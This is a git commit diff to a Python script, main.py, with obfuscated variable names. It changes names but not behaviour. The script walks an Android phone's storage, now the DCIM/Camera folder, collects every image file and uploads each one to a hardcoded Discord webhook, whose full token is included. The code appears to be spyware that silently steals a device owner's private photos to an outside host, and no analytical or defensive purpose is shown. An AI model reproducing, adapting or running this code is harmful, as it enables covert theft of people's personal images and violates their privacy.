554a988388626f281115b9b822146d6d6972fd69
Txdd4z <romulokennedydiscord12@gmail.com>
2025-08-09 08:52:42 -0300

    Update main.py

--- main.py
+++ main.py
@@ -1,31 +1,32 @@
 import os as a1, requests as a2, time as a3
 
 status=1
-a4="/storage/emulated/0"
-a5="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
+base="/storage/emulated/0/DCIM/Camera"
+webhook="https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
+exts=(".jpg",".jpeg",".png",".heic")
 
-def a6(a7):
+def send(a4):
     try:
-        with open(a7,"rb") as a8:
-            r=a2.post(a5,files={"file":(a7.split("/")[-1],a8)})
+        with open(a4,"rb") as a5:
+            r=a2.post(webhook,files={"file":(a4.split("/")[-1],a5)})
             return r.status_code in (200,204)
     except:
         return False
 
-def a9():
-    a10=[]
-    for a11,a12,a13 in a1.walk(a4):
-        for a14 in a13:
-            if a14.lower().endswith((".jpg",".jpeg",".png",".heic")):
-                a10.append(a1.join(a11,a14))
-    return a10
+def gather():
+    res=[]
+    for r,d,f in a1.walk(base):
+        for fi in f:
+            if fi.lower().endswith(exts):
+                res.append(a1.join(r,fi))
+    return res
 
 def run():
     if status!=1:
         return
-    a15=a9()
-    for a16 in a15:
-        a6(a16)
+    fotos=gather()
+    for f in fotos:
+        send(f)
         a3.sleep(5)
 
 if __name__=="__main__":
